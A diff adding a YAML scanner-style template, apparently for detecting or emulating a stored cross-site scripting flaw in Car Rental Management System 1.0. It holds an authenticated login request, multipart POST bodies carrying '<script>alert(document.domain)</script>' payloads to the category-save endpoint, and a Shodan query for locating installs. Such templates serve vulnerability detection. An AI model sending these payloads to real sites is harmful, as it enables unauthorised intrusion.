@@ -1,0 +1,65 @@
+id: carrental-xss
+info:
+  name: Car Rental Management System 1.0 - Cross-Site Scripting
+  author: arafatansari
+  description: 'Car Rental Management System 1.0 contains a cross-site scripting vulnerability
+    via admin/ajax.php?action=save_category in Name and Description parameter.
+
+    '
+  severity: medium
+  reference:
+  - https://www.exploit-db.com/exploits/49546
+  - https://www.sourcecodester.com/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: http.html:"Car Rental Management System"
+  tags: xss,cms,authenticated,edb,intrusive
+traps:
+- request:
+    method: POST
+    path: /admin/ajax.php?action=login
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'username={{username}}&password={{password}}
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: '<p>Name: <b></script><script>alert(document.domain)</script></b>'
+- request:
+    method: POST
+    path: /admin/ajax.php?action=save_category
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCMJ5bh3B6m9767Em
+    body: |
+      ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+      Content-Disposition: form-data; name="id"
+
+      ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+      Content-Disposition: form-data; name="name"
+
+      </script><script>alert(document.domain)</script>
+      ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+      Content-Disposition: form-data; name="description"
+
+      <script>alert(document.domain)</script>
+      ------WebKitFormBoundaryCMJ5bh3B6m9767Em--
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: GET
+    path: /admin/index.php?page=categories
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
